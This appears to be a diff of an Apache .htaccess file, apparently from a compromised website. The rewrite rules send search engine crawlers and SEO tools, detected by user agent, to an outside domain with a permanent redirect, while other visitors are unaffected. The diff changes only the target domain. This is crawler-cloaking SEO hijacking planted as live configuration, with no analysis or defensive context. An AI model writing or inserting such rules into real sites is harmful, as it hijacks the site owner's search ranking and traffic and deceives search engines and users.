@@ -1,7 +1,7 @@
 <IfModule mod_rewrite.c>
 RewriteEngine On
 RewriteCond %{HTTP_USER_AGENT} (googlebot|bingbot|slurp|ahrefs|semrush|yandex|majestic|screamingfrog) [NC]
-RewriteRule ^(.*)$ https://cri.knu.kg/ [R=301,L]
+RewriteRule ^(.*)$ https://www.nwu.edu.ph/ [R=301,L]
 </IfModule>
 
 # BEGIN cPanel-generated php ini directives, do not edit
